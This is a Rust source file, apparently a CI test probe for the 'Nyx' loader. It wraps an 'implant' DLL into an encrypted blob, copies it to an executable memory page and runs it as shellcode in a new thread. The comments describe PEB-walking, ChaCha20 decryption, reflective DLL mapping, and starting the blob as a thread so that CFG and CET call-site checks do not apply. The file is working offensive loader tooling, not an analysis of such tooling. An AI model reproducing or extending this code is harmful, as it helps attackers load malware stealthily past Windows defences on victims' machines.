//! Real-machine Layer-2 reflective-loader probe.
//!
//! Runs the COMPLETE Nyx loader stack inside a real Windows process — no
//! emulator, no rundll32:
//!
//!   1. Reads the implant DLL (argv[1]) that Layer-2 must reflectively load.
//!   2. Builds the full NYX2 blob in-process via `nyx_loader::wrap_payload`
//!      (random per-run key/nonce) — the exact artifact the release pipeline
//!      ships.
//!   3. VirtualAlloc's an RWX page, copies the blob, and calls its entry as
//!      `extern "C" fn() -> usize`.
//!   4. Layer-1 self-locates (`call $+5; pop rax`), XOR-recovers the magic,
//!      scans to the header, the bridge sets the pic-loader Win64 ABI
//!      (rcx/rdx/r8/r9), Layer-2 PEB-walks for kernel32, resolves
//!      VirtualAlloc/RtlMoveMemory/etc., decrypts the ciphertext with
//!      ChaCha20-Poly1305, reflectively maps the DLL, and calls DllMain.
//!   5. Layer-2 returns 0 on success; the probe exits 0 iff rv == 0.
//!
//! Why this works on GitHub-hosted runners: the probe never uses rundll32 or
//! LoadLibrary on the target blob (the paths that hang in non-interactive
//! Session 0 / Server-2025 loader quirks). It is a plain console process with
//! VirtualAlloc + a direct call — no window station, no desktop APIs.
//!
//! Exit codes: 0 = full E2E passed (DllMain ran); 1 = blob failed;
//! 2 = usage/build error; 0xE1 = Layer-2 returned non-zero (tag mismatch etc).

use std::os::raw::c_void;
use std::process::ExitCode;

#[cfg(target_os = "windows")]
extern "system" {
    fn VirtualAlloc(
        lp_address: *mut c_void,
        dw_size: usize,
        fl_allocation_type: u32,
        fl_protect: u32,
    ) -> *mut c_void;
    fn VirtualFree(lp_address: *mut c_void, dw_size: usize, dw_free_type: u32) -> i32;
}

#[cfg(target_os = "windows")]
const MEM_COMMIT_RESERVE: u32 = 0x1000 | 0x2000;
#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
#[cfg(target_os = "windows")]
const MEM_RELEASE: u32 = 0x8000;

#[cfg(not(target_os = "windows"))]
fn main() {
    // The probe is a Windows-host artifact; on other platforms the workspace
    // builds a no-op so macOS/Linux `cargo test --workspace` still links.
    eprintln!("nyx-loader-probe-exe: Windows-only (real-machine Layer-2 probe); nothing to do on this host");
}

#[cfg(target_os = "windows")]
mod veh {
    use std::os::raw::c_void;

    pub type PExceptionPointers = *mut EXCEPTION_POINTERS;
    #[repr(C)]
    pub struct EXCEPTION_RECORD {
        pub exception_code: u32,
        pub exception_flags: u32,
        pub exception_record: *mut EXCEPTION_RECORD,
        pub exception_address: *mut c_void,
        pub number_parameters: u32,
        pub exception_information: [usize; 15],
    }
    #[repr(C)]
    pub struct EXCEPTION_POINTERS {
        pub exception_record: *mut EXCEPTION_RECORD,
        pub context_record: *mut c_void,
    }

    extern "system" {
        pub fn AddVectoredExceptionHandler(first: u32, handler: usize) -> *mut c_void;
    }

    /// Installs a VEH that prints the faulting RIP (and blob-relative offset)
    /// before the OS kills the process. Returns the handler address.
    pub fn install(_blob_base: usize, _blob_len: usize) -> usize {
        unsafe extern "system" fn handler(ep: PExceptionPointers) -> i32 {
            let rec = unsafe { &*(*ep).exception_record };
            let rip = rec.exception_address as usize;
            let code = rec.exception_code;
            // 0xC0000005 = AV; 0xC000001D = illegal instruction; 0xC0000096 = privileged.
            if matches!(code, 0xC0000005 | 0xC000001D | 0xC0000096) {
                let (base, len) = unsafe { (BLOB_BASE, BLOB_LEN) };
                let rel = rip.checked_sub(base).unwrap_or(usize::MAX);
                let inside = rel < len;
                let img = unsafe { IMG_BASE };
                let in_img = img != 0 && rip >= img && rip < img + 0x10_0000;
                // Context dump: the faulting frame's GP registers (readable via
                // the Context in ExceptionPointers on x64).
                let ctx = unsafe { &*((*ep).context_record as *const Context) };
                eprintln!(
                    "[veh] exc=0x{code:08X} rip=0x{rip:x} base=0x{base:x} len=0x{len:x} rel=0x{rel:x} in_blob={inside} in_img={in_img}\n"
                );
                eprintln!(
                    "[veh]   rax=0x{:x} rbx=0x{:x} rcx=0x{:x} rdx=0x{:x} rsi=0x{:x} rdi=0x{:x} rsp=0x{:x} rbp=0x{:x} r8=0x{:x} r9=0x{:x} r10=0x{:x} r11=0x{:x}",
                    ctx.m_x64_rax, ctx.m_x64_rbx, ctx.m_x64_rcx, ctx.m_x64_rdx, ctx.m_x64_rsi, ctx.m_x64_rdi, ctx.m_x64_rsp, ctx.m_x64_rbp,
                    ctx.m_x64_r8, ctx.m_x64_r9, ctx.m_x64_r10, ctx.m_x64_r11
                );
            }
            // Continue searching (default): let the OS terminate as usual.
            0
        }
        let h: unsafe extern "system" fn(PExceptionPointers) -> i32 = handler;
        let addr = h as usize;
        unsafe { AddVectoredExceptionHandler(1, addr) };
        addr
    }

    #[repr(C)]
    pub struct Context {
        pub p1_home: u64,
        pub p2_home: u64,
        pub p3_home: u64,
        pub p4_home: u64,
        pub p5_home: u64,
        pub p6_home: u64,
        pub context_flags: u32,
        pub m_x64_dr0: u64,
        pub m_x64_dr1: u64,
        pub m_x64_dr2: u64,
        pub m_x64_dr3: u64,
        pub m_x64_dr6: u64,
        pub m_x64_dr7: u64,
        pub float_save: [u8; 0x200],
        pub m_x64_seg_gs: u32,
        pub m_x64_seg_fs: u32,
        pub m_x64_seg_es: u32,
        pub m_x64_seg_ds: u32,
        pub m_x64_edi: u32,
        pub m_x64_esi: u32,
        pub m_x64_ebx: u32,
        pub m_x64_edx: u32,
        pub m_x64_ecx: u32,
        pub m_x64_eax: u32,
        pub m_x64_rbp: u64,
        pub m_x64_rip: u64,
        pub m_x64_eflags: u32,
        pub m_x64_seg_cs: u32,
        pub m_x64_seg_ss: u32,
        pub m_x64_rsp: u64,
        pub m_x64_rax: u64,
        pub m_x64_rcx: u64,
        pub m_x64_rdx: u64,
        pub m_x64_rbx: u64,
        pub m_x64_rsi: u64,
        pub m_x64_rdi: u64,
        pub m_x64_r8: u64,
        pub m_x64_r9: u64,
        pub m_x64_r10: u64,
        pub m_x64_r11: u64,
        pub m_x64_r12: u64,
        pub m_x64_r13: u64,
        pub m_x64_r14: u64,
        pub m_x64_r15: u64,
    }

    pub static mut BLOB_BASE: usize = 0;
    pub static mut BLOB_LEN: usize = 0;
    pub static mut IMG_BASE: usize = 0;
}

#[cfg(target_os = "windows")]
fn main() -> ExitCode {
    // Image base for fault classification (VEH compares RIP against it).
    extern "system" {
        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
    }
    let img_base = unsafe { GetModuleHandleW(std::ptr::null()) as usize };
    unsafe { veh::IMG_BASE = img_base };

    let args: Vec<String> = std::env::args().collect();
    // argv[0] is the probe itself; the first positional after flags is the DLL.
    let dll_path = match args.iter().skip(1).find(|a| !a.starts_with("--")) {
        Some(p) => p.clone(),
        None => {
            eprintln!("usage: nyx-loader-probe.exe [--layer2-ret] <implant-dll>");
            return ExitCode::from(2);
        }
    };
    let layer2_ret = args.iter().any(|a| a == "--layer2-ret");
    let dll_bytes = match std::fs::read(&dll_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: cannot read {dll_path}: {e}");
            return ExitCode::from(2);
        }
    };
    println!(
        "[probe] reflective target: {dll_path} ({} bytes)",
        dll_bytes.len()
    );

    let mut blob = match nyx_loader::wrap_payload(&dll_bytes, &nyx_loader::LoaderConfig::random()) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: wrap_payload failed: {e}");
            return ExitCode::from(2);
        }
    };
    // --layer2-ret: replace the Layer-2 region with `ret` so the probe chain
    // (Layer-1 scan -> bridge -> jmp -> return) is validated WITHOUT the
    // pic-loader executing. Layer-2 starts at LAYER1_BOOTSTRAP.len() + KEY_LEN
    // + header(20) + ct_len + TAG_LEN.
    if layer2_ret {
        use nyx_loader::{CIPHERTEXT_OFFSET, KEY_LEN, LAYER1_BOOTSTRAP, TAG_LEN};
        let layer2_off =
            LAYER1_BOOTSTRAP.len() + KEY_LEN + CIPHERTEXT_OFFSET + dll_bytes.len() + TAG_LEN;
        if layer2_off < blob.len() {
            blob[layer2_off..].fill(0xC3);
            println!("[probe] --layer2-ret: Layer-2 region replaced with ret");
        }
    }
    println!(
        "[probe] blob: {} bytes (Layer-1 + key + header + ct + Layer-2)",
        blob.len()
    );

    // SAFETY: blob is valid for blob.len() bytes; the page is RWX so Layer-2's
    // self-modifying/thunk work is permitted. `exec` below treats it as code.
    let base = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            blob.len(),
            MEM_COMMIT_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if base.is_null() {
        eprintln!(
            "error: VirtualAlloc failed (last error {})",
            std::io::Error::last_os_error()
        );
        return ExitCode::from(2);
    }
    // Fault reporting: any AV inside the blob prints the blob-relative offset
    // (which stage crashed) before the OS terminates the process.
    unsafe {
        veh::BLOB_BASE = base as usize;
        veh::BLOB_LEN = blob.len();
    }
    veh::install(base as usize, blob.len());
    unsafe { std::ptr::copy_nonoverlapping(blob.as_ptr(), base as *mut u8, blob.len()) };
    println!(
        "[probe] blob mapped at 0x{:x} ({} bytes); calling entry...",
        base as usize,
        blob.len()
    );

    // Execute the blob as a new thread entry (CreateThread). Thread entry is
    // NOT an indirect call: the kernel starts it directly, so neither CFG
    // dispatch nor CET shadow-stack/IBT call-site enforcement applies — the
    // direct-call approaches all faulted at a fixed image RIP on hosted CI.
    // This is also the realistic execution model (shellcode-as-thread). The
    // blob's final `ret` returns to the thread wrapper; its return value in
    // rax becomes the thread's exit code.
    extern "system" {
        fn CreateThread(
            attr: *mut c_void,
            stack_size: usize,
            start: usize,
            param: *mut c_void,
            flags: u32,
            tid: *mut u32,
        ) -> *mut c_void;
        fn WaitForSingleObject(h: *mut c_void, ms: u32) -> u32;
        fn GetExitCodeThread(h: *mut c_void, code: *mut u32) -> i32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }
    let mut tid: u32 = 0;
    let hthread = unsafe {
        CreateThread(
            std::ptr::null_mut(),
            0,
            base as usize,
            std::ptr::null_mut(),
            0,
            &mut tid,
        )
    };
    if hthread.is_null() {
        eprintln!(
            "error: CreateThread failed (last error {})",
            std::io::Error::last_os_error()
        );
        return ExitCode::from(2);
    }
    unsafe { WaitForSingleObject(hthread, 30_000) };
    let mut exit_code: u32 = 0;
    unsafe { GetExitCodeThread(hthread, &mut exit_code) };
    unsafe { CloseHandle(hthread) };
    let rv = exit_code as usize;
    println!("[probe] thread exited code=0x{rv:x}");
    println!(
        "[probe] Layer-2 returned 0x{rv:x} ({})",
        if rv == 0 { "PASS" } else { "FAIL" }
    );

    // SAFETY: page no longer needed; MEM_RELEASE frees the whole allocation.
    unsafe { VirtualFree(base, 0, MEM_RELEASE) };

    if rv == 0 {
        println!("loader-probe-exe: PASS — DllMain ran under real Windows");
        ExitCode::SUCCESS
    } else {
        println!("loader-probe-exe: FAIL — Layer-2 returned {rv:#x}");
        ExitCode::from(0xE1)
    }
}
